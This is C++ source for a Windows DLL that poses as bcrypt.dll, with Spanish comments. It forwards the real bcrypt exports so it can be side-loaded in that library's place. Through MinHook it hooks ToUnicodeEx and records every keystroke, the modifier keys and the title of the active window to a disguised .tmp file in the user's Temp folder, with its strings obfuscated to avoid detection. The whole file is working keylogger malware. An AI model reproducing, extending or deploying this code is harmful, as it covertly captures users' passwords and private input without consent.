// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#pragma comment(lib, "user32.lib")
#include <Windows.h>
#include <fstream>
#include <string>
#include <iostream>
#include <cstdlib>
#include <vector>
#include "MinHook.h"
#include "obfusheader.h"

#pragma comment(lib, "minhook.x64.lib")

// Exports originales
#pragma comment(linker, "/export:BCryptAddContextFunction=C:\\Windows\\System32\\bcrypt.BCryptAddContextFunction")
#pragma comment(linker, "/export:BCryptAddContextFunctionProvider=C:\\Windows\\System32\\bcrypt.BCryptAddContextFunctionProvider")
#pragma comment(linker, "/export:BCryptCloseAlgorithmProvider=C:\\Windows\\System32\\bcrypt.BCryptCloseAlgorithmProvider")
#pragma comment(linker, "/export:BCryptConfigureContext=C:\\Windows\\System32\\bcrypt.BCryptConfigureContext")
#pragma comment(linker, "/export:BCryptConfigureContextFunction=C:\\Windows\\System32\\bcrypt.BCryptConfigureContextFunction")
#pragma comment(linker, "/export:BCryptCreateContext=C:\\Windows\\System32\\bcrypt.BCryptCreateContext")
#pragma comment(linker, "/export:BCryptCreateHash=C:\\Windows\\System32\\bcrypt.BCryptCreateHash")
#pragma comment(linker, "/export:BCryptCreateMultiHash=C:\\Windows\\System32\\bcrypt.BCryptCreateMultiHash")
#pragma comment(linker, "/export:BCryptDecapsulate=C:\\Windows\\System32\\bcrypt.BCryptDecapsulate")
#pragma comment(linker, "/export:BCryptDecrypt=C:\\Windows\\System32\\bcrypt.BCryptDecrypt")
#pragma comment(linker, "/export:BCryptDeleteContext=C:\\Windows\\System32\\bcrypt.BCryptDeleteContext")
#pragma comment(linker, "/export:BCryptDeriveKey=C:\\Windows\\System32\\bcrypt.BCryptDeriveKey")
#pragma comment(linker, "/export:BCryptDeriveKeyCapi=C:\\Windows\\System32\\bcrypt.BCryptDeriveKeyCapi")
#pragma comment(linker, "/export:BCryptDeriveKeyPBKDF2=C:\\Windows\\System32\\bcrypt.BCryptDeriveKeyPBKDF2")
#pragma comment(linker, "/export:BCryptDestroyHash=C:\\Windows\\System32\\bcrypt.BCryptDestroyHash")
#pragma comment(linker, "/export:BCryptDestroyKey=C:\\Windows\\System32\\bcrypt.BCryptDestroyKey")
#pragma comment(linker, "/export:BCryptDestroySecret=C:\\Windows\\System32\\bcrypt.BCryptDestroySecret")
#pragma comment(linker, "/export:BCryptDuplicateHash=C:\\Windows\\System32\\bcrypt.BCryptDuplicateHash")
#pragma comment(linker, "/export:BCryptDuplicateKey=C:\\Windows\\System32\\bcrypt.BCryptDuplicateKey")
#pragma comment(linker, "/export:BCryptEncapsulate=C:\\Windows\\System32\\bcrypt.BCryptEncapsulate")
#pragma comment(linker, "/export:BCryptEncrypt=C:\\Windows\\System32\\bcrypt.BCryptEncrypt")
#pragma comment(linker, "/export:BCryptEnumAlgorithms=C:\\Windows\\System32\\bcrypt.BCryptEnumAlgorithms")
#pragma comment(linker, "/export:BCryptEnumContextFunctionProviders=C:\\Windows\\System32\\bcrypt.BCryptEnumContextFunctionProviders")
#pragma comment(linker, "/export:BCryptEnumContextFunctions=C:\\Windows\\System32\\bcrypt.BCryptEnumContextFunctions")
#pragma comment(linker, "/export:BCryptEnumContexts=C:\\Windows\\System32\\bcrypt.BCryptEnumContexts")
#pragma comment(linker, "/export:BCryptEnumProviders=C:\\Windows\\System32\\bcrypt.BCryptEnumProviders")
#pragma comment(linker, "/export:BCryptEnumRegisteredProviders=C:\\Windows\\System32\\bcrypt.BCryptEnumRegisteredProviders")
#pragma comment(linker, "/export:BCryptExportKey=C:\\Windows\\System32\\bcrypt.BCryptExportKey")
#pragma comment(linker, "/export:BCryptFinalizeKeyPair=C:\\Windows\\System32\\bcrypt.BCryptFinalizeKeyPair")
#pragma comment(linker, "/export:BCryptFinishHash=C:\\Windows\\System32\\bcrypt.BCryptFinishHash")
#pragma comment(linker, "/export:BCryptFreeBuffer=C:\\Windows\\System32\\bcrypt.BCryptFreeBuffer")
#pragma comment(linker, "/export:BCryptGenRandom=C:\\Windows\\System32\\bcrypt.BCryptGenRandom")
#pragma comment(linker, "/export:BCryptGenerateKeyPair=C:\\Windows\\System32\\bcrypt.BCryptGenerateKeyPair")
#pragma comment(linker, "/export:BCryptGenerateSymmetricKey=C:\\Windows\\System32\\bcrypt.BCryptGenerateSymmetricKey")
#pragma comment(linker, "/export:BCryptGetFipsAlgorithmMode=C:\\Windows\\System32\\bcrypt.BCryptGetFipsAlgorithmMode")
#pragma comment(linker, "/export:BCryptGetProperty=C:\\Windows\\System32\\bcrypt.BCryptGetProperty")
#pragma comment(linker, "/export:BCryptHash=C:\\Windows\\System32\\bcrypt.BCryptHash")
#pragma comment(linker, "/export:BCryptHashData=C:\\Windows\\System32\\bcrypt.BCryptHashData")
#pragma comment(linker, "/export:BCryptImportKey=C:\\Windows\\System32\\bcrypt.BCryptImportKey")
#pragma comment(linker, "/export:BCryptImportKeyPair=C:\\Windows\\System32\\bcrypt.BCryptImportKeyPair")
#pragma comment(linker, "/export:BCryptKeyDerivation=C:\\Windows\\System32\\bcrypt.BCryptKeyDerivation")
#pragma comment(linker, "/export:BCryptOpenAlgorithmProvider=C:\\Windows\\System32\\bcrypt.BCryptOpenAlgorithmProvider")
#pragma comment(linker, "/export:BCryptProcessMultiOperations=C:\\Windows\\System32\\bcrypt.BCryptProcessMultiOperations")
#pragma comment(linker, "/export:BCryptQueryContextConfiguration=C:\\Windows\\System32\\bcrypt.BCryptQueryContextConfiguration")
#pragma comment(linker, "/export:BCryptQueryContextFunctionConfiguration=C:\\Windows\\System32\\bcrypt.BCryptQueryContextFunctionConfiguration")
#pragma comment(linker, "/export:BCryptQueryContextFunctionProperty=C:\\Windows\\System32\\bcrypt.BCryptQueryContextFunctionProperty")
#pragma comment(linker, "/export:BCryptQueryProviderRegistration=C:\\Windows\\System32\\bcrypt.BCryptQueryProviderRegistration")
#pragma comment(linker, "/export:BCryptRegisterConfigChangeNotify=C:\\Windows\\System32\\bcrypt.BCryptRegisterConfigChangeNotify")
#pragma comment(linker, "/export:BCryptRegisterProvider=C:\\Windows\\System32\\bcrypt.BCryptRegisterProvider")
#pragma comment(linker, "/export:BCryptRemoveContextFunction=C:\\Windows\\System32\\bcrypt.BCryptRemoveContextFunction")
#pragma comment(linker, "/export:BCryptRemoveContextFunctionProvider=C:\\Windows\\System32\\bcrypt.BCryptRemoveContextFunctionProvider")
#pragma comment(linker, "/export:BCryptResolveProviders=C:\\Windows\\System32\\bcrypt.BCryptResolveProviders")
#pragma comment(linker, "/export:BCryptSecretAgreement=C:\\Windows\\System32\\bcrypt.BCryptSecretAgreement")
#pragma comment(linker, "/export:BCryptSetAuditingInterface=C:\\Windows\\System32\\bcrypt.BCryptSetAuditingInterface")
#pragma comment(linker, "/export:BCryptSetContextFunctionProperty=C:\\Windows\\System32\\bcrypt.BCryptSetContextFunctionProperty")
#pragma comment(linker, "/export:BCryptSetProperty=C:\\Windows\\System32\\bcrypt.BCryptSetProperty")
#pragma comment(linker, "/export:BCryptSignHash=C:\\Windows\\System32\\bcrypt.BCryptSignHash")
#pragma comment(linker, "/export:BCryptUnregisterConfigChangeNotify=C:\\Windows\\System32\\bcrypt.BCryptUnregisterConfigChangeNotify")
#pragma comment(linker, "/export:BCryptUnregisterProvider=C:\\Windows\\System32\\bcrypt.BCryptUnregisterProvider")
#pragma comment(linker, "/export:BCryptVerifySignature=C:\\Windows\\System32\\bcrypt.BCryptVerifySignature")

// Prototipo de la funcion
typedef int (WINAPI* pToUnicodeEx)(UINT, UINT, const BYTE*, LPWSTR, int, UINT, HKL);

// Pointer hacia la funcion original
pToUnicodeEx fpToUnicodeEx = NULL;

// Funcion Hook
int WINAPI HookToUnicodeEx(UINT wVirtKey, UINT wScanCode, const BYTE *lpKeyState, LPWSTR pwszBuff, int cchBuff, UINT wFlags, HKL dwhkl)
{

    // Result para llamar a funcion original
    int result = fpToUnicodeEx(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
    if (!(wScanCode & 0x8000))  // Si NO es key up
    {
        char* userChar = nullptr;
        size_t lenUser = 0;
        _dupenv_s(&userChar, &lenUser, OBF("USERNAME"));
        std::wstring userName(userChar, userChar + std::strlen(userChar));
        free(userChar);
        std::wstring filePath = OBF(L"C:\\Users\\") + userName + OBF(L"\\AppData\\Local\\Temp\\wct3C3F97.tmp");
        std::wofstream log(filePath, std::ios::app);

        if (log.is_open())
        {
            // Timestamp
            SYSTEMTIME st;
            GetLocalTime(&st);
            log << OBF(L"[") << st.wHour << OBF(L":") << st.wMinute << OBF(L":") << st.wSecond << OBF(L"] ");

            // Información de la tecla
            log << OBF(L"VK:0x") << std::hex << wVirtKey << std::dec << OBF(L" SC:") << wScanCode << L" ";

            // Teclas especiales
            if (wVirtKey == VK_RETURN) log << OBF(L"[ENTER]");
            else if (wVirtKey == VK_BACK) log << OBF(L"[BACKSPACE]");
            else if (wVirtKey == VK_TAB) log << OBF(L"[TAB]");
            else if (wVirtKey == VK_SPACE) log << OBF(L"[SPACE]");
            else if (wVirtKey == VK_SHIFT) log << OBF(L"[SHIFT]");
            else if (wVirtKey == VK_CONTROL) log << OBF(L"[CTRL]");
            else if (wVirtKey == VK_MENU) log << OBF(L"[ALT]");
            else if (wVirtKey == VK_CAPITAL) log << OBF(L"[CAPSLOCK]");
            else if (wVirtKey == VK_ESCAPE) log << OBF(L"[ESC]");
            else if (wVirtKey == VK_DELETE) log << OBF(L"[DELETE]");
            else if (wVirtKey == VK_HOME) log << OBF(L"[HOME]");
            else if (wVirtKey == VK_END) log << OBF(L"[END]");
            else if (wVirtKey == VK_PRIOR) log << OBF(L"[PAGEUP]");
            else if (wVirtKey == VK_NEXT) log << OBF(L"[PAGEDOWN]");
            else if (wVirtKey == VK_LEFT) log << OBF(L"[LEFT]");
            else if (wVirtKey == VK_RIGHT) log << OBF(L"[RIGHT]");
            else if (wVirtKey == VK_UP) log << OBF(L"[UP]");
            else if (wVirtKey == VK_DOWN) log << OBF(L"[DOWN]");
            else if (wVirtKey >= VK_F1 && wVirtKey <= VK_F24)
                log << OBF(L"[F") << (wVirtKey - VK_F1 + 1) << OBF(L"]");
            else if (wVirtKey >= VK_NUMPAD0 && wVirtKey <= VK_NUMPAD9)
                log << OBF(L"[NUM") << (wVirtKey - VK_NUMPAD0) << OBF(L"]");
            else if (result > 0)
            {
                // Caracteres normales
                log << OBF(L"'");
                for (int i = 0; i < result; i++)
                    log << pwszBuff[i];
                log << OBF(L"'");
            }
            else if (result == 0)
            {
                log << OBF(L"[NO_TRANSLATION]");
            }
            else if (result < 0)
            {
                log << OBF(L"[DEAD_KEY]");
            }

            // Estado de modificadores
            log << OBF(L" Mods:[");
            if (lpKeyState[VK_SHIFT] & 0x80) log << OBF(L"SHIFT ");
            if (lpKeyState[VK_CONTROL] & 0x80) log << OBF(L"CTRL ");
            if (lpKeyState[VK_MENU] & 0x80) log << OBF(L"ALT ");
            if (lpKeyState[VK_CAPITAL] & 0x01) log << OBF(L"CAPS ");
            log << L"]";

            // Obtener título de ventana activa
            HWND hwnd = GetForegroundWindow();
            if (hwnd)
            {
                WCHAR windowTitle[256];
                GetWindowTextW(hwnd, windowTitle, 256);
                log << OBF(L" Window:\"") << windowTitle << OBF(L"\"");
            }

            log << std::endl;
            log.close();
        }
    }
    // Return de funcion original con result
    return result;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Inicializacion de minhook
        if (MH_Initialize() != MH_OK)
        {
            return 1;
        }

        // Crear el hook con minhook
        // 1ar Puntero Funcion Original
        // 2ar Puntero Funcion para el Hook
        // 3ar Inicializacion de la direccion del puntero original
        if (MH_CreateHook(&ToUnicodeEx, &HookToUnicodeEx,
            reinterpret_cast<LPVOID*>(&fpToUnicodeEx)) != MH_OK)
        {
            return 1;
        }

        // Habilitar el Hook
        if (MH_EnableHook(&ToUnicodeEx) != MH_OK)
        {
            return 1;
        }
        break;

    case DLL_PROCESS_DETACH:
        if (MH_DisableHook(&ToUnicodeEx) != MH_OK)
        {
            return 1;
        }
        break;
    }
    return TRUE;
}

